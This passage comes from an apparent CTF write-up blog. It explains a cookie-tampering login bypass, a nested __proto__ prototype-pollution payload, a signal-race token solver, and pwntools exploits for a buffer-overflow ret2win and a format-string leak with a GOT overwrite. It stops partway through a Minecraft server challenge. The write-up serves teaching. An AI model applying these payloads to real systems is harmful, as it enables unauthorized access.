</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">result</span><span class="o">.</span><span class="n">stdout</span><span class="p">)</span>
</span></span></code></pre></div><p><strong><code>plugin_manifest.json</code></strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;My exploit&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;version&#34;</span><span class="p">:</span> <span class="s2">&#34;1.0&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;author&#34;</span><span class="p">:</span> <span class="s2">&#34;hecker&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;icon&#34;</span><span class="p">:</span> <span class="s2">&#34;icon.png&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h3 id="random-gallery">Random Gallery<a hidden class="anchor" aria-hidden="true" href="#random-gallery">#</a></h3>
<h4 id="challenge-recap">Challenge Recap<a hidden class="anchor" aria-hidden="true" href="#challenge-recap">#</a></h4>
<p>Random Gallery is a web challenge based on a simple authentication flaw.<br>
When you visit the site, you‚Äôre greeted by a login page, but there‚Äôs no option to register‚Äîso logging in seems impossible.</p>
<p>By inspecting the browser cookies, you‚Äôll spot a <code>logged_in</code> cookie set to <code>false</code>.<br>
If you manually change this value to <code>true</code> and go to the index page (<code>/</code>), you gain access to the site.</p>
<p>Once inside, explore a bit and you‚Äôll come across a QR code:</p>
<!-- raw HTML omitted -->
<p>Scan the QR code to get the flag</p>
<h3 id="theme-generator">Theme-Generator<a hidden class="anchor" aria-hidden="true" href="#theme-generator">#</a></h3>
<p>Theme-Generator is a web app that allows users to upload and merge JSON presets for customizing themes. The application includes protections against prototype pollution and restricts certain sensitive actions to admin users only.</p>
<p>Prototype pollution is a subtle and dangerous vulnerability that affects JavaScript applications. It occurs when an attacker is able to inject properties into JavaScript‚Äôs global object prototype (<code>Object.prototype</code>). Since all objects inherit from this prototype, polluting it can have far-reaching consequences,potentially allowing an attacker to escalate privileges or alter application behavior in unexpected ways.</p>
<p>In this challenge, the developers tried to defend against prototype pollution by blocking any top-level keys named <code>__proto__</code>, <code>prototype</code>, or <code>constructor</code> in incoming JSON data:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kr">const</span> <span class="nx">k</span> <span class="k">of</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="nx">data</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">([</span><span class="s2">&#34;__proto__&#34;</span><span class="p">,</span> <span class="s2">&#34;prototype&#34;</span><span class="p">,</span> <span class="s2">&#34;constructor&#34;</span><span class="p">].</span><span class="nx">includes</span><span class="p">(</span><span class="nx">k</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;blocked&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>At first glance, this seems like a reasonable defense. However, the check only inspects the top-level keys of the submitted JSON object. If an attacker nests a malicious key deeper inside the object, the filter is bypassed. For example, sending the following payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span> <span class="nt">&#34;user&#34;</span><span class="p">:</span> <span class="p">{</span> <span class="nt">&#34;__proto__&#34;</span><span class="p">:</span> <span class="p">{</span> <span class="nt">&#34;isAdmin&#34;</span><span class="p">:</span> <span class="kc">true</span> <span class="p">}</span> <span class="p">}</span> <span class="p">}</span>
</span></span></code></pre></div><p>will sneak the <code>__proto__</code> property into the object prototype, setting <code>isAdmin</code> to <code>true</code> for all objects. This effectively grants admin privileges to the attacker.</p>
<p>With admin access, it‚Äôs then possible to make a request to the <code>/admin/flag</code> endpoint and retrieve the flag. This challenge highlights the importance of deep validation when dealing with user-supplied objects in JavaScript, especially when merging</p>
<h2 id="binary-exploitation-">Binary exploitation üè¥‚Äç‚ò†Ô∏è<a hidden class="anchor" aria-hidden="true" href="#binary-exploitation-">#</a></h2>
<h3 id="sigdance">Sigdance<a hidden class="anchor" aria-hidden="true" href="#sigdance">#</a></h3>
<h4 id="code-analysis">Code Analysis<a hidden class="anchor" aria-hidden="true" href="#code-analysis">#</a></h4>
<p>The challenge consists of two C files: <code>main.c</code> and <code>plugin.c</code>.</p>
<h5 id="mainc"><code>main.c</code><a hidden class="anchor" aria-hidden="true" href="#mainc">#</a></h5>
<p>This file contains the main logic of the program. Its key actions are:</p>
<ul>
<li>It sets up signal handlers for <code>SIGALRM</code> and <code>SIGUSR1</code>.</li>
<li>It uses <code>setitimer</code> to generate <code>SIGALRM</code> signals at a regular interval (every 7ms).</li>
<li>It creates a new thread that repeatedly sends <code>SIGUSR1</code> signals to the main process (every 5ms).</li>
<li>It calls <code>nanosleep</code> for 777 milliseconds.</li>
<li>It dynamically loads a shared library <code>libcore.so</code> and calls a function <code>verify</code> from it.</li>
<li>The program reads user input and passes it to the <code>verify</code> function. If <code>verify</code> returns true, the flag is printed.</li>
</ul>
<h5 id="pluginc"><code>plugin.c</code><a hidden class="anchor" aria-hidden="true" href="#pluginc">#</a></h5>
<p>This file is compiled into <code>libcore.so</code> and contains the <code>verify</code> function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">verify</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">provided</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">ac</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">uc</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint32_t</span> <span class="n">token</span> <span class="o">=</span> <span class="p">((</span><span class="n">ac</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">uc</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">pid</span> <span class="o">&amp;</span> <span class="mi">255u</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">provided</span> <span class="o">==</span> <span class="n">token</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The <code>verify</code> function calculates a <code>token</code> based on three values:</p>
<ul>
<li><code>ac</code>: The count of <code>SIGALRM</code> signals received.</li>
<li><code>uc</code>: The count of <code>SIGUSR1</code> signals received.</li>
<li><code>pid</code>: The lower 8 bits of the process ID.</li>
</ul>
<p>To solve the challenge, we need to predict the values of <code>ac</code> and <code>uc</code> and provide the correct token.</p>
<h4 id="the-vulnerability">The Vulnerability<a hidden class="anchor" aria-hidden="true" href="#the-vulnerability">#</a></h4>
<p>The core vulnerability lies in the interaction between the <code>nanosleep</code> function and the signals.</p>
<p>The <code>main</code> function calls <code>nanosleep</code> for 777ms. However, it does not check the return value of <code>nanosleep</code>. According to the <code>nanosleep</code> man page, if the sleep is interrupted by a signal, it returns <code>-1</code> and sets <code>errno</code> to <code>EINTR</code>.</p>
<p>In this program, two different signals are being generated concurrently:</p>
<ol>
<li><code>SIGALRM</code> is scheduled to fire every 7ms.</li>
<li>The separate thread sends <code>SIGUSR1</code> every 5ms.</li>
</ol>
<p>Since the <code>SIGUSR1</code> signal arrives first (after 5ms), it interrupts the <code>nanosleep</code> call. The program execution continues immediately without sleeping for the full duration.</p>
<p>Crucially, the line that disables the <code>SIGALRM</code> timer is <em>after</em> the <code>nanosleep</code> call:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">setitimer</span><span class="p">(</span><span class="n">ITIMER_REAL</span><span class="p">,</span> <span class="o">&amp;</span><span class="p">(</span><span class="k">struct</span> <span class="n">itimerval</span><span class="p">){</span><span class="mi">0</span><span class="p">},</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span></code></pre></div><p>Because <code>nanosleep</code> is interrupted before the first <code>SIGALRM</code> (7ms) has a chance to fire, the timer is disabled, and the <code>SIGALRM</code> handler is never called.</p>
<p>The program then waits for the <code>SIGUSR1</code>-sending thread to complete its loop, which sends a total of 13 signals.</p>
<p>This means the final counts will always be:</p>
<ul>
<li><code>ac = 0</code></li>
<li><code>uc = 13</code></li>
</ul>
<h4 id="the-solution">The Solution<a hidden class="anchor" aria-hidden="true" href="#the-solution">#</a></h4>
<p>With the predictable values of <code>ac</code> and <code>uc</code>, we can create a simple program to calculate the required token.</p>
<p><strong><code>solver.c</code></strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// gcc -o solver solver.c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Usage: %s &lt;pid8&gt;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kt">uint32_t</span> <span class="n">pid8</span> <span class="o">=</span> <span class="nf">strtoul</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint32_t</span> <span class="n">ac</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint32_t</span> <span class="n">uc</span> <span class="o">=</span> <span class="mi">13</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kt">uint32_t</span> <span class="n">token</span> <span class="o">=</span> <span class="p">((</span><span class="n">ac</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">uc</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">^</span> <span class="n">pid8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%u</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">token</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><strong><code>solve.py</code></strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;ctf.ac.upt.ro&#34;</span><span class="p">,</span> <span class="mi">9749</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;= &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pid</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;PID: </span><span class="si">{</span><span class="n">pid</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">res</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s1">&#39;./solver&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">pid</span><span class="p">)],</span> <span class="n">check</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span></code></pre></div><h3 id="baby-bof">baby-bof<a hidden class="anchor" aria-hidden="true" href="#baby-bof">#</a></h3>
<p><strong>baby-bof</strong> is a beginner-friendly pwn challenge that introduces one of the most classic vulnerabilities: <strong>Buffer Overflow</strong>.</p>
<h4 id="challenge-overview">Challenge Overview<a hidden class="anchor" aria-hidden="true" href="#challenge-overview">#</a></h4>
<p>The decompiled code (e.g., from IDA) reveals that the executable reads <code>0x100</code> bytes into a buffer that is only 64 bytes in size:</p>
<p><img alt="Decompiled code showing buffer overflow" loading="lazy" src="/images/babybof.png"></p>
<p>This allows us to write past the end of the buffer and overwrite the <em>stack</em>, including the return address. By doing so, we can redirect execution to any function we want‚Äîin this case, the <code>win()</code> function.<br>
This technique is commonly called <strong>ret2win</strong>.<br>
For more details, see <a href="https://ir0nstone.gitbook.io/notes/binexp/stack/ret2win">this guide</a>.</p>
<h4 id="exploit-1">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-1">#</a></h4>
<p>Here‚Äôs the exploit script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./challenge&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;ctf.ac.upt.ro&#39;</span><span class="p">,</span> <span class="mi">9806</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">path</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">        b rww
</span></span></span><span class="line"><span class="cl"><span class="s1">        c
</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 64 bytes buffer + 8 bytes saved RBP = 72 bytes to reach return address</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">72</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="o">.</span><span class="n">win</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><p><strong>Explanation:</strong></p>
<ul>
<li>The payload overflows the buffer and overwrites the return address with the address of <code>win()</code>.</li>
<li>The script works locally, with GDB, or remotely.</li>
</ul>
<h3 id="fini">fini<a hidden class="anchor" aria-hidden="true" href="#fini">#</a></h3>
<p><strong>fini</strong> is the first challenging pwn task in this series. Here, we need to exploit a more advanced vulnerability known as a <strong>format string bug</strong>.</p>
<h4 id="finding-the-vulnerability">Finding the Vulnerability<a hidden class="anchor" aria-hidden="true" href="#finding-the-vulnerability">#</a></h4>
<p>The vulnerability is easy to spot if you are familiar with format string bugs.<br>
In the decompiled code (see image below), the program calls <code>printf()</code> <strong>without</strong> specifying a format string, like <code>%s</code>:</p>
<p><img alt="Decompiled code showing vulnerable printf" loading="lazy" src="image-1.png"></p>
<p>This means user input is passed directly to <code>printf</code>, allowing us to control the format string and leak stack values or write to arbitrary memory.</p>
<p>Additionally, the program provides a feature that lets us write any value to any address‚Äîthis will be useful for exploitation.</p>
<h4 id="exploiting-the-vulnerability">Exploiting the Vulnerability<a hidden class="anchor" aria-hidden="true" href="#exploiting-the-vulnerability">#</a></h4>
<p>Since <code>printf</code> is called without a format string, we can send our own format specifiers. For example, sending <code>%p</code> will print a stack address.<br>
If we send a payload like <code>%p.%p.%p.%p.%p.%p.%p.%p.</code>, the program will print out several stack addresses in order, separated by dots.<br>
This helps us see the stack layout and find which offset corresponds to interesting values (like the return address or function pointers).<br>
You can increase the number of <code>%p</code> specifiers to print more stack values, or use GDB to inspect the stack and count how many <code>%p</code> are needed to reach a specific value.</p>
<p>By experimenting, we discover that <code>%50$p</code> leaks the address of <code>main</code>.<br>
This allows us to calculate the base address of the binary, even if PIE (Position Independent Executable) is enabled.</p>
<p>Next, we use the program&rsquo;s write-anywhere feature to overwrite the <strong>GOT entry</strong> for <code>printf</code> with the address of the <code>win()</code> function.<br>
This way, when <code>printf</code> is called again, it will actually call <code>win()</code> and give us the flag.</p>
<h4 id="exploit-script">Exploit Script<a hidden class="anchor" aria-hidden="true" href="#exploit-script">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./challenge&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;ctf.ac.upt.ro&#39;</span><span class="p">,</span> <span class="mi">9777</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">path</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">        b main
</span></span></span><span class="line"><span class="cl"><span class="s1">        c
</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Leak the address of main using the format string vulnerability</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;%50$p&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;, &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Main address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">main</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Calculate the PIE base address</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">main</span> <span class="o">-</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="o">.</span><span class="n">main</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Base address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Use the program&#39;s feature to overwrite printf@GOT with win()</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">printf</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="o">.</span><span class="n">win</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Get the flag!</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><h4 id="summary">Summary<a hidden class="anchor" aria-hidden="true" href="#summary">#</a></h4>
<ul>
<li>The vulnerability is a classic format string bug due to an unsafe <code>printf</code> call.</li>
<li>We leak the address of <code>main</code> to defeat PIE.</li>
<li>We overwrite <code>printf</code>&rsquo;s GOT entry with the address of <code>win()</code>.</li>
<li>When the program calls <code>printf</code> again, it jumps to <code>win()</code> and gives us the flag.</li>
</ul>
<h3 id="minecrafty">Minecrafty<a hidden class="anchor" aria-hidden="true" href="#minecrafty">#</a></h3>
<p>This challenge shipped a custom <strong>Go-based Minecraft server</strong> (modified <code>go-mc/server</code>) plus a &ldquo;hint&rdquo; file, <strong><code>message.txt</code></strong>, containing a Node.js bot that talks the Minecraft protocol. The objective was to trigger the server to print the flag in chat.</p>
<p>The core idea: the <strong><code>!flag</code></strong> chat command checks your <strong>exact</strong> XYZ and only returns the real flag if you‚Äôre standing at <strong>(69420, 69420, 69420)</strong>. Movement is rate-limited, but not enough to stop a bot from walking there in small hops.</p>
<h4 id="whats-interesting-in-the-server">What‚Äôs interesting in the server<a hidden class="anchor" aria-hidden="true" href="#whats-interesting-in-the-server">#</a></h4>
<p><strong>1. The chat command gate</strong></p>
<p>In <code>server/game/chat.go</code>, the server inspects incoming chat. When the message is <code>!flag</code>, it reads the player‚Äôs current <code>Position</code> and compares it to <code>(69420, 69420, 69420)</code>. If you‚Äôre not there, it taunts you with a decoy:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="k">switch</span><span class="w"> </span><span class="nb">string</span><span class="p">(</span><span class="nx">message</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">case</span><span class="w"> </span><span class="s">&#34;!flag&#34;</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nx">x</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nb">int32</span><span class="p">(</span><span class="nx">player</span><span class="p">.</span><span class="nx">Position</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nx">y</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nb">int32</span><span class="p">(</span><span class="nx">player</span><span class="p">.</span><span class="nx">Position</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nx">z</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nb">int32</span><span class="p">(</span><span class="nx">player</span><span class="p">.</span><span class="nx">Position</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">69420</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">y</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">69420</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">z</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">69420</span><span class="w"> </span><span class="p">{</span><span class="w">
